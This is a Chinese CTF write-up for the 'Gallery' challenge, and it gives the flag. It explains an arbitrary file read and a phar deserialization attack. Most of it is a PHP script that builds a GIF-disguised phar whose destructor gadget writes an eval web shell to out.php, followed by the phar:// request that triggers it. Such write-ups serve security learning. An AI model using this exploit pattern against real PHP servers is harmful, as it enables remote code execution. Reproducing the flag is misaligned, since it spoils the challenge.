# Gallery Writeup
flag:suctf{phar_s3rial1ze_f4nt4s71C}

读取图片的接口存在任意文件读取的漏洞，可以读取到网站源码。cookie中给出提示`read recent papers about phar`,最近phar有关的比较热门的就是phar反序列化，生成phar的脚本为：
```php
<?php

 class PicManager{
	 private $current_dir;
	 private $whitelist=['jpg','png','gif'];
	 private $logfile='request.log';
	 private $actions=[];

	 public function __construct($dir){
		 $this->current_dir=$dir;
		 if(!is_dir($dir))@mkdir($dir);
	 }

	 private function _log($message){
		 array_push($this->actions,'['.date('y-m-d h:i:s',time()).']'.$message);
	 }

	 public function pics(){
		 log('list pics');
		 $pics=[];
		 foreach(scandir($dir) as $item){
			 if(in_array(substr($item,-4),$whitelist))
				 array_push($pics,$current_dir."/".$item);
		 }
		 return $pics;
	 }
	 public function upload_pic(){
		 _log('upload pic');
		 $file=$_FILES['file']['name'];
		 if(!in_array(substr($file,-4),$this->whitelist)){
			 _log('unsafe deal:upload filename '.$file);
			 return;
		 }
		 $newname=md5($file).substr($file,-4);
		 move_uploaded_file($_FILES['file']['tmp_name'],$current_dir.'/'.$newname);
	 }
	 public function get_pic($picname){
		 _log('get pic'.$picname);
		 if(!file_exists($picname))
			 return '';
		 else return file_get_contents($picname);
	 }
	 public function __destruct(){
		 $fp=fopen($this->current_dir.'/'.$this->logfile,"a+");
		 foreach($this->actions as $act){
			 fwrite($fp,$act."\n");
		 }
		 fclose($fp);
	 }

	 public function gen(){
		 @rmdir($this->current_dir);
		 $this->current_dir="/var/www/html/sandbox/1b5337d0c8ad813197b506146d8d503d/"; //md5($_SERVER['REMOTE_ADDR'])
		 $this->logfile='out.php';
		 $this->actions=['<?php eval($_REQUEST[p]);'];
		 @unlink('phar.phar');
		 $phar = new Phar("phar.phar");
		 $phar->startBuffering();
		 $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub，增加gif文件头用以欺骗检测
		 $phar->setMetadata($this); //将自定义meta-data存入manifest
		 $phar->addFromString("test.txt", "test"); //添加要压缩的文件
			     //签名自动计算
		 $phar->stopBuffering();
			 //    

	 }
 }

$pic=new PicManager('/var/www/html/sandbox');
$pic->gen();

```

生成phar后重命名为图片文件，上传后访问
```
?act=get&file=phar:///上传后的图片路径
```

再访问生成的out.php即可获取flag